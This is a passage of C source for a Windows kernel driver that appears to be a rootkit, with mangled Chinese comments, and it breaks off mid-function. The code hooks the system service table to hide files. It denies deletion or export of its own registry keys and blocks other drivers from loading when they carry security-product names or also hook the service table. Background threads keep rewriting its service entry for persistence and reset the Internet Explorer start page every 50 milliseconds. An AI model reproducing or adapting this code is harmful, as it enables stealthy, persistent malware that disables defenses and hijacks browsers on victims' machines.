	status = ((ZWQUERYDIRECTORYFILE)(Orig_ZwQueryDirectoryFile)) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		FileInformationLength,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);       

	if( !NT_SUCCESS(status) )
		return status;

	curr = FileInformation;    
	switch( FileInformationClass )
	{/*  
	 case FileDirectoryInformation:
	 NameOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileName)) - ((ULONG)curr);
	 NameSizeOffset = ((ULONG)&(((PFILE_DIRECTORY_INFORMATION)curr)->FileNameLength)) - (ULONG)curr);      
	 break;
	 */

	case FileFullDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_FULL_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);           
		break;

	case FileBothDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_BOTH_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);       
		break;

	case FileNamesInformation:
		NameOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_NAMES_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);         
		break;

	case FileIdBothDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_ID_BOTH_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr); 
		break;

	case FileIdFullDirectoryInformation:
		NameOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileName)) - ((ULONG)curr);
		NameSizeOffset = ((ULONG)&(((PFILE_ID_FULL_DIR_INFORMATION)curr)->FileNameLength)) - ((ULONG)curr);   
		break;        

	default:
		return status;      
	}

	for(i=0; i<NbFileToHide; i++) {

		curr = FileInformation;  

		prev = NULL;
		while( curr ) {

			DeltaCurr = (PULONG)curr;
			DeltaPrev = (PULONG)prev;

			FileNamePtr = (WCHAR*)((PBYTE)curr + NameOffset);
			FileNameLength = (PULONG) ((PBYTE)curr + NameSizeOffset);         

			if( FileNamePtr!=NULL && *FileNameLength == wcslen(FileToHide[i])*2 &&\
				!memcmp( FileNamePtr,FileToHide[i],(SIZE_T) * FileNameLength ) ) {    
					// ΪҪ���ص��ļ�,����֮
					if( !prev ) {
						if( *DeltaCurr )
							(PBYTE)FileInformation += *DeltaCurr;
						else
							FileInformation = NULL;   
					} else {
						if( *DeltaCurr )
							*DeltaPrev += *DeltaCurr; 
						else
							*DeltaPrev = 0;   
					}    
			} else {
				prev = curr;
			}

			if( *DeltaCurr )  
				curr += *DeltaCurr;
			else  
				curr = NULL;

		}
	}

	return status;
}



NTSTATUS
fake_ZwSaveKey(
			   IN HANDLE KeyHandle,
			   IN HANDLE FileHandle
			   )
			   /*++

			   ����: sudami  08/02/28

			   ���� : 
			   �滻���� ZwSaveKey.��������ע����ֵ

			   --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	UNICODE_STRING  ucName;

	RtlInitUnicodeString( &ucName, reg_name);

	// ΪҪ��ѯ�����ݷ���ռ�
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// ͨ��handle�õ�object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// ͨ��object�õ�name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	if (NT_SUCCESS (status)) {
		if ( RtlCompareUnicodeString( p_wcName, &ucName, TRUE ) == 0) {
			// �ٺ�,��Ҫ���õ�����,����deny
			// nvmini���ܵġ���HLKM\SYSTEM���ͽ���������
			ExFreePool(p_wcName);

			return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwSaveKey (KeyHandle, FileHandle);	

	return status; 
}


NTSTATUS
fake_ZwDeleteKey(
				 IN HANDLE KeyHandle
				 )
				 /*++

				 ����: sudami  08/02/28

				 ���� : 
				 �滻���� ZwDeleteKey.��������ע����ֵ

				 --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	PWSTR     p_wcStr;

	// ΪҪ��ѯ�����ݷ���ռ�
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// ͨ��handle�õ�object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// ͨ��object�õ�name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	p_wcStr = (PWSTR)(p_wcName->Buffer);

	if (NT_SUCCESS (status)) { // ����
		if ( (wcsstr( p_wcStr, L"nvmini" ) != NULL) || \
			(wcsstr ( p_wcStr, L"LEGACY_NVMINI") != NULL) ) {

				ExFreePool(p_wcName);
				return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwDeleteKey (KeyHandle);	

	return status; 
}


NTSTATUS
fake_ZwDeleteValueKey(
					  IN HANDLE  KeyHandle,
					  IN PUNICODE_STRING  ValueName
					  )
					  /*++

					  ����: sudami  08/02/28

					  ���� : 
					  �滻���� ZwDeleteValueKey.��������ע����ֵ

					  --*/
{
	NTSTATUS   status;
	PVOID      pObject;
	DWORD	   d_size;
	PUNICODE_STRING p_wcName;
	PWSTR     p_wcStr;

	// ΪҪ��ѯ�����ݷ���ռ�
	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)\
		+(sizeof(WCHAR)*1024));

	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	// ͨ��handle�õ�object
	status = ObReferenceObjectByHandle (KeyHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pObject, NULL);
	if( !NT_SUCCESS(status) ) {
		ExFreePool(p_wcName);
		return status;
	}

	ObDereferenceObject( pObject );

	// ͨ��object�õ�name
	status = ObQueryNameString (pObject, (POBJECT_NAME_INFORMATION) p_wcName,\
		p_wcName->MaximumLength, &d_size);

	p_wcStr = (PWSTR)(p_wcName->Buffer);

	if (NT_SUCCESS (status)) { // ����
		if ( (wcsstr( p_wcStr, L"nvmini" ) != NULL) || \
			(wcsstr ( p_wcStr, L"LEGACY_NVMINI") != NULL) ) {

				ExFreePool(p_wcName);
				return STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	ExFreePool(p_wcName);
	status = Orig_ZwDeleteValueKey (KeyHandle, ValueName);	

	return status; 
}


NTSTATUS 
fake_ZwLoadDriver(
				  IN PUNICODE_STRING  DriverServiceName
				  )
				  /*++

				  ����: sudami  08/02/28

				  ����:
				  DriverServiceName - Ҫ���ص�������ע����е��Ӽ�

				  ���� : 
				  �滻����ZwLoadDriver.��ָֹ���б��е���������.��ֹ������к���SSDT�������ļ���

				  --*/
{

	NTSTATUS   status;
	OBJECT_ATTRIBUTES oa;
	PUNICODE_STRING   p_a = NULL;
	UNICODE_STRING    ucName;
	ULONG             ResultLength;
	HANDLE            KeyHandle;
	PVOID			  p;
	PKEY_VALUE_PARTIAL_INFORMATION valueInfoP;
	ULONG     valueInfoLength, returnLength;
	PWCHAR            ValueName = NULL;
	WCHAR Name[300];

	RtlCopyMemory(Name , DriverServiceName->Buffer, DriverServiceName->MaximumLength );
	_wcsupr(Name);

	// ���ַ����а����б��е�����,�͹��˵�
	if ( (wcsstr( Name, ban_1 ) != NULL) || 
		(wcsstr( Name, ban_2 ) != NULL) || 
		(wcsstr( Name, ban_3 ) != NULL) || 
		(wcsstr( Name, ban_4 ) != NULL) || 
		(wcsstr( Name, ban_5 ) != NULL) || 
		(wcsstr( Name, ban_6 ) != NULL) || 
		(wcsstr( Name, ban_7 ) != NULL) || 
		(wcsstr( Name, ban_8 ) != NULL) || 
		(wcsstr( Name, ban_9 ) != NULL) || 
		(wcsstr( Name, ban_a ) != NULL) || 
		(wcsstr( Name, ban_b ) != NULL) || 
		(wcsstr( Name, ban_c ) != NULL) ||
		(wcsstr( Name, ban_e ) != NULL) ||
		(wcsstr( Name, L"MP1" ) != NULL)||
		(wcsstr( Name, L"360" ) != NULL) ||
		(wcsstr( Name, L"SNIPE" ) != NULL)) {

			return STATUS_ACCESS_DENIED;
			//g_CurrentHandle = PsGetCurrentProcessId ();
	} else { // �鿴�������Ƿ����SDT

		InitializeObjectAttributes (&oa,DriverServiceName,OBJ_CASE_INSENSITIVE,NULL,NULL);
		status = ZwOpenKey( &KeyHandle, KEY_ALL_ACCESS, &oa );

		if (NT_SUCCESS (status)) {

			RtlInitUnicodeString( &ucName, ban_d ); // ImagePath
			valueInfoLength = sizeof( KEY_VALUE_PARTIAL_INFORMATION ) + 100;
			valueInfoP      =    (PKEY_VALUE_PARTIAL_INFORMATION) \
				ExAllocatePoolWithTag (NonPagedPool, valueInfoLength, 'skdD');

			if ( valueInfoP == NULL ) { // �����ڴ�ʧ��
				ZwClose (KeyHandle);
				return Orig_ZwLoadDriver( DriverServiceName );	
			}

			status = ZwQueryValueKey (KeyHandle, &ucName, 2, \
				valueInfoP, valueInfoLength, &returnLength);

			if ( NT_SUCCESS(status) ) { // ��������ȫ·������ ValueName����
				RtlCopyMemory((PCHAR)ValueName, (PCHAR)valueInfoP->Data, valueInfoP->DataLength);

				if (IsExistSDT( (PCWSTR)ValueName ) == TRUE) { // �������ĵ�����к���SDT,���������

					ZwClose (KeyHandle);
					ExFreePool (valueInfoP);
					return STATUS_ACCESS_DENIED;
				}
			}

			ExFreePool (valueInfoP);
		}

		ZwClose (KeyHandle);
	}	


	return Orig_ZwLoadDriver( DriverServiceName );
}

BOOL IsExistSDT(PWCHAR FullPath)
			/*++

			����: sudami  08/02/28

			����:
			FullPath - Ҫ���ص�����������·��

			���� : 
			ͨ��sysȫ·��.����,ӳ��4KB�����ݵ���������ռ�, �ҵ������.
			��ÿ�������DLL,����IMAGE_THUNK_DATA����,�������еĵ��뺯��,
			��������KeServiceDescriptorTableƥ��.��������ҳɹ�.ֱ�ӷ���
			TRUE��fake_ZwLoadDriver��. �������ʧ��. -.=|

			--*/

{
	NTSTATUS   status;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK   io;
	UNICODE_STRING    wc_FullPath;
	ULONG             Ntheader_adr;
	HANDLE            hSection, hFile, hMod; 
	SIZE_T            size = 0;
	PVOID             BaseAddress = NULL;
	IMAGE_DOS_HEADER           *dosheader;
	IMAGE_OPTIONAL_HEADER      *opthdr;
	IMAGE_IMPORT_DESCRIPTOR    *pImportDesc;
	IMAGE_THUNK_DATA           *pThunk;
	IMAGE_IMPORT_BY_NAME       *pImportName;
	CHAR                       *pszDllName;
	BYTE                       *pName;
	SECTION_IMAGE_INFORMATION  sii;

	RtlInitUnicodeString( &wc_FullPath, FullPath ); 
	InitializeObjectAttributes (&oa, &wc_FullPath, OBJ_CASE_INSENSITIVE,NULL,NULL);

	status = ZwOpenFile( &hFile, 0x100020, &oa, &io, 1, 0x20 );
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwOpenFile failed.");
		return FALSE;
	}

	oa.ObjectName = 0;
	status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, &oa, 0,PAGE_EXECUTE, SEC_IMAGE, hFile);
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwCreateSection failed.");
		ZwClose (hFile);
		return FALSE;
	}

	status =  ZwMapViewOfSection( hSection, NtCurrentProcess(), &BaseAddress, 0, 1000, 0,\
		&size, (SECTION_INHERIT)1, /*MEM_TOP_DOWN*/0x100000, /*PAGE_READWRITE*/4 ); 
	if ( !NT_SUCCESS (status) ) {
		DbgPrint("IsExistSDT --> ZwMapViewOfSection failed.");
		ZwClose (hFile);
		ZwClose (hSection);
		return FALSE;
	}

	// ��ʼ����PE��
	hMod = BaseAddress;
	dosheader = (IMAGE_DOS_HEADER *)hMod;
	opthdr =(IMAGE_OPTIONAL_HEADER *) ((BYTE*)hMod + dosheader->e_lfanew + 24);

	//ȡ�õ�����׵�ַ
	pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hMod + \
		opthdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	while (pImportDesc->FirstThunk) {  //ȡ��ģ������
		pszDllName = (char*)((BYTE*)hMod + pImportDesc->Name);
		if (pszDllName == NULL) {
			break;
		}

		if (pImportDesc->FirstThunk) { 
			pThunk = (IMAGE_THUNK_DATA*)((BYTE*)hMod + pImportDesc->FirstThunk);

			while (pThunk->u1.AddressOfData) {

				pImportName = (IMAGE_IMPORT_BY_NAME*) (&(pThunk->u1.AddressOfData));

				//IAT�����һ��DWORD ���飬ÿ����Ա��¼һ��������ַ
				pName = (BYTE*)&(pImportName->Name);
				if ( !strcmp( pName, "KeServiceDescriptorTable" ) ){
					return TRUE;
				}
				pThunk++;
			}
		}
	}

	return FALSE;
}


VOID 
MyStartHook ( )
/*++

����: sudami  08/02/28

����:
bhook - ��־hook����unhook

����:
hook ssdt,�Ӹ�Timer������дhook
unhook ssdt, ȥ��Timer [��ԭidb�в��ֳ���.ʵ��ͬ�����ܼ���]

--*/
{

	if( !ZwClose_Hooked ) { // 1
		WPOFF();

		(ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_Close)) = fake_ZwClose;

		WPON();
		ZwClose_Hooked = TRUE;
	}


	if( !ZwLoadDriver_Hooked ) { // 2
		WPOFF();
		(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = fake_ZwLoadDriver;
		WPON();
		ZwLoadDriver_Hooked = TRUE;
	}


	if( !ZwQueryDirectoryFile_Hooked ) { // 3
		WPOFF();

		(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile) ) = fake_ZwQueryDirectoryFile;

		WPON();
		ZwQueryDirectoryFile_Hooked = TRUE;
	}


	if( !ZwSaveKey_Hooked ) { // 4
		WPOFF();

		(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_SaveKey) ) = fake_ZwSaveKey;

		WPON();
		ZwSaveKey_Hooked = TRUE;
	}

	if( !ZwDeleteKey_Hooked ) { // 5
		WPOFF();

		(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) = fake_ZwDeleteKey;

		WPON();
		ZwDeleteKey_Hooked = TRUE;
	}

	if( !ZwEnumerateKey_Hooked ) { // 6
		WPOFF();

		(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) = fake_ZwEnumerateKey;

		WPON();
		ZwEnumerateKey_Hooked = TRUE;
	}

	if( !ZwDeleteValueKey_Hooked ) { // 7
		WPOFF();

		(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) ) = fake_ZwDeleteValueKey;

		WPON();
		ZwDeleteValueKey_Hooked = TRUE;
	}
}

VOID 
MyUnHook ()
{
	if( ZwClose_Hooked ) { // 1
		WPOFF();

		(ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_Close)) = Orig_ZwClose;

		WPON();
	}

	if( ZwLoadDriver_Hooked ) { // 2
		WPOFF();

		(ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_LoadDriver)) = Orig_ZwLoadDriver;

		WPON();
	}

	if( ZwQueryDirectoryFile_Hooked ) { // 3
		WPOFF();

		(ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_QueryDirectoryFile) ) = Orig_ZwQueryDirectoryFile;

		WPON();
	}


	if( ZwSaveKey_Hooked ) { // 4
		WPOFF();

		(ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_SaveKey) ) = Orig_ZwSaveKey;

		WPON();
	}

	if( ZwDeleteKey_Hooked ) { // 5
		WPOFF();

		(ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteKey) ) = Orig_ZwDeleteKey;

		WPON();
	}

	if( ZwEnumerateKey_Hooked ) { // 6
		WPOFF();

		(ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_EnumerateKey) ) = Orig_ZwEnumerateKey;

		WPON();
	}

	if( ZwDeleteValueKey_Hooked ) { // 7
		WPOFF();

		(ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + pos_DeleteValueKey) ) = Orig_ZwDeleteValueKey;

		WPON();
	}
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            ������3������������дע��������              +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

NTSTATUS
SetSysRegKey (
			  HANDLE Key
			  )
			  /*++

			  ����: sudami  08/02/28

			  ����:
			  Key - �Ӽ��ľ��

			  ����:
			  �����������

			  --*/
{
	NTSTATUS status;
	UNICODE_STRING name;
	ULONG value;
	WCHAR RegKeyValue[128] = L"Pointer Port";
	WCHAR RegKeyValue_a[128] = L"sudami����������";
	WCHAR RegKeyValue_b[128] = L"system32\\DRIVERS\\sudami.sys";

	value = 0;
	RtlInitUnicodeString (&name, L"ErrorControl");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 2;
	RtlInitUnicodeString (&name, L"Start");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 1;
	RtlInitUnicodeString (&name, L"Type");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	value = 7;
	RtlInitUnicodeString (&name, L"Tag");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_DWORD,
		&value,
		sizeof (value));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"Group");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_SZ,
		RegKeyValue,
		sizeof (RegKeyValue));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"DisplayName");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_SZ,
		RegKeyValue_a,
		sizeof (RegKeyValue_a));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	RtlInitUnicodeString (&name, L"ImagePath");
	status = ZwSetValueKey (Key,
		&name,
		0,
		REG_EXPAND_SZ,
		L"system32\\DRIVERS\\sudami.sys",
		sizeof (L"system32\\DRIVERS\\sudami.sys"));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	// �����ú���,�ɹ�����
	return STATUS_SUCCESS;
}


VOID
Thread_WriteReg (
				 IN PVOID StartContext
				 )
				 /*++

				 ����: sudami  08/02/28

				 ����:
				 ����һ��ϵͳ�߳�������дע���. ����å�� o(*.*)0

				 --*/
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	IO_STATUS_BLOCK     IoStatusBlock;
	OBJECT_ATTRIBUTES   objectAttributes;

	/* �����¼����� */
	InitializeObjectAttributes( &objectAttributes,
		NULL,
		OBJ_OPENIF|OBJ_KERNEL_HANDLE,
		(HANDLE) NULL,
		(PSECURITY_DESCRIPTOR) NULL );

	status = ZwCreateEvent( &g_EventHandle,
		EVENT_ALL_ACCESS,
		&objectAttributes,
		0,
		FALSE );

	if (!NT_SUCCESS(status)) {
		PsTerminateSystemThread( status );
	}

	status = ObReferenceObjectByHandle (g_EventHandle, FILE_ANY_ACCESS, NULL,\
		KernelMode, &pEventObject, NULL);
	if( !NT_SUCCESS(status) ) {
		return;
	}

	swprintf( Buffer, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", L"sudami" );
	RtlInitUnicodeString( &KeyName, Buffer );

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { /*------------- ����ѭ��д�� --------------*/

		if (g_bRepeatWrite_reg == FALSE) {
			ZwClose( g_EventHandle );
			PsTerminateSystemThread( STATUS_SUCCESS );
		}

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (!NT_SUCCESS(status)) { // �����ھʹ���֮
			status = ZwCreateKey(
				&KeyHandle,
				KEY_ALL_ACCESS,
				&objectAttributes,
				0,
				NULL,
				0,
				NULL);

			if (!NT_SUCCESS(status)) {
				PsTerminateSystemThread( status );
			}  
		}

		// ����,��ʼдע�����. retry and retry ...
		status = SetSysRegKey( KeyHandle );

		// ����Ҫ������ע����ֵ,һ�иĶ���֪ͨ,��å��~~~~
		// һ���ӵ��Ķ����������¼�����Ϊsignaled ״̬
		// ����ж��ʱ,Ҫ��KeSetEvent����ֹ�ȴ�,Ȼ������ g_bRepeatWrite
		// Ϊ0 �˳�ѭ��
		//
		//PS:   
		// ͻȻ�����ں�Timer����IRQL�ȸ���ԭ��,�ǳ�������,�������˺þö�û�ɹ�.
		// ���ǻ���ϵͳ�߳�ʵ��ѭ��.
		// [add 08/03/03 sudami] 
		ZwNotifyChangeKey( KeyHandle, g_EventHandle, 0, 0, &IoStatusBlock, \
			15, TRUE, NULL, 0, TRUE );

		// һֱ�ȴ���ֱ�����¼���Ϊ����״̬
		ZwWaitForSingleObject( g_EventHandle, FALSE, NULL ); 
		ZwClose( KeyHandle );
	} 
}


BOOL 
StartThread_reg (
				 )
				 /*++

				 ����: sudami  08/02/28

				 ����:
				 ����һ��ϵͳ�߳�������дע���. ����å�� o(*.*)0

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg,
		NULL);


	g_bRepeatWrite_reg = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            ������3������������дע���IE��ҳ              +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


NTSTATUS
SetRegKey_IE (
			  HANDLE Key
			  )
			  /*++

			  ����: sudami  08/02/28

			  ����:
			  Key - �Ӽ��ľ��

			  ����:
			  �����������

			  --*/
{
	NTSTATUS status;
	UNICODE_STRING IE;
	WCHAR IE_a[128]          = L"http://hi.baidu.com/sudami";

	RtlInitUnicodeString (&IE, L"Start Page");
	status = ZwSetValueKey (Key,
		&IE,
		0,
		REG_SZ,
		IE_a,
		sizeof (IE_a));

	if (!NT_SUCCESS (status)) {
		return status;
	}

	// �����ú���,�ɹ�����
	return STATUS_SUCCESS;
}


VOID
Thread_WriteReg_IE (
					IN PVOID StartContext
					)
					/*++

					����: sudami  08/02/28

					����:
					����һ��ϵͳ�߳�������дע���. ����å�� o(*.*)0

					--*/
{
	NTSTATUS		status;
	HANDLE          KeyHandle = NULL;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	IO_STATUS_BLOCK     IoStatusBlock;
	OBJECT_ATTRIBUTES   objectAttributes;
	UNICODE_STRING		a;
	PEPROCESS			proc;

	LARGE_INTEGER interval;
	interval.QuadPart = -5 * 1000 * 100;     // 50ms, relative


	/* 2�ε���,�õ�services.exe��EPROCESS */

	status = GetEProcessByName (L"EXPLORER.EXE", &proc);
	if( !NT_SUCCESS(status) ) {
		status = GetEProcessByName (L"explorer.exe", &proc); 

		if( !NT_SUCCESS(status) )  
			return;
	}

	/* ���ŵ��˽����� */
	KeAttachProcess (proc); 
	RtlFormatCurrentUserKeyPath( &a );
	KeDetachProcess();


	/* �õ�CurrentUser��ָ���Ӽ���ȫ·�� */
	KeyName.Length = 0;
	KeyName.MaximumLength = (USHORT)(a.MaximumLength  +
		sizeof( L"\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN" ) +
		sizeof( UNICODE_NULL ));
	KeyName.Buffer =  (RtlAllocateStringRoutine)( KeyName.MaximumLength );
	if (KeyName.Buffer == NULL) {
		DbgPrint("KeyName->Buffer == NULL, failed\n");
		return;
	}

	status = RtlAppendUnicodeStringToString( &KeyName, &a );
	if ( !NT_SUCCESS( status )) {
		DbgPrint("RtlAppendUnicodeStringToString( &KeyName, &a ); failed: %08lx\n", status); 
	}

	status = RtlAppendUnicodeToString( &KeyName, L"\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN" );
	if ( !NT_SUCCESS( status )) {
		DbgPrint("\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN -- failed: %08lx\n", status); 
	}

	DbgPrint("%ws\n", KeyName.Buffer);

	InitializeObjectAttributes(
		&objectAttributes,
		&KeyName,
		OBJ_CASE_INSENSITIVE,
		(HANDLE)NULL,
		NULL
		);

	while (TRUE) { 

		if (g_bRepeatWrite_reg_IE == FALSE) {
			PsTerminateSystemThread( STATUS_SUCCESS );
		}
		//status = MyOpenUserKey( Buffer, KeyName, KeyHandle );

		status = ZwOpenKey(
			&KeyHandle,
			KEY_READ | KEY_WRITE,
			&objectAttributes
			);

		if (!NT_SUCCESS(status)) { // �����ھʹ���֮
			status = ZwCreateKey(
				&KeyHandle,
				KEY_ALL_ACCESS,
				&objectAttributes,
				0,
				NULL,
				0,
				NULL);

			if (!NT_SUCCESS(status)) {
				PsTerminateSystemThread( status );
			}  
		}

		// ����,��ʼдע�����. retry and retry ...
		SetRegKey_IE( KeyHandle );
		ZwClose( KeyHandle );
		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	} // end-while
}

BOOL 
StartThread_reg_IE (
				 )
				 /*++

				 ����: sudami  08/02/28

				 ����:
				 ����һ��ϵͳ�߳�������дע���. ����å�� o(*.*)0

				 --*/
{
	HANDLE ThreadHandle;
	if (!NT_SUCCESS(PsCreateSystemThread (&ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		0L,
		NULL,
		Thread_WriteReg_IE,
		NULL))) {
			return FALSE;
	}

	ObReferenceObjectByHandle (ThreadHandle,
		THREAD_ALL_ACCESS,
		NULL,
		KernelMode,
		(PVOID *)&pThreadObj_reg_IE,
		NULL);


	g_bRepeatWrite_reg_IE = TRUE;
	ZwClose (ThreadHandle);
	return TRUE;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+          ����3����������ɾ��ע����Ȩ��������            +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--


VOID
Thread_WriteReg_Group (
					   IN PVOID StartContext
					   )
{
	NTSTATUS		status;
	HANDLE          KeyHandle;
	UNICODE_STRING  KeyName;
	WCHAR			Buffer[128];
	OBJECT_ATTRIBUTES   objectAttributes;

	LARGE_INTEGER interval;
